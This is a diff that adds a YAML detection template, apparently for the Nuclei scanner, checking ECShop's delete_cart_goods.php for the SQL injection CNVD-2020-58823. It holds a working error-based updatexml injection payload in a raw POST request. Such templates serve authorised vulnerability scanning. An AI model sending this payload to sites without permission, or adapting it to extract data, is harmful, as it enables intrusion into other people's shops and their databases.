@@ -1,0 +1,24 @@
+id: poc-yaml-ecshop-cnvd-2020-58823-sqli
+
+info:
+  name: poc-yaml-ecshop-cnvd-2020-58823-sqli
+  author: 凉风(http://webkiller.cn/)
+  severity: high
+  tags: xray-converted,sqli,cnvd-2020-58823,ct-158128
+  reference:
+    - https://mp.weixin.qq.com/s/1t0uglZNoZERMQpXVVjIPw
+
+http:
+  - raw:
+      - |
+        POST /delete_cart_goods.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        id=0||(updatexml(1,concat(0x7e,(select%20md5({{rand_int(1000, 9999)}})),0x7e),1))
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
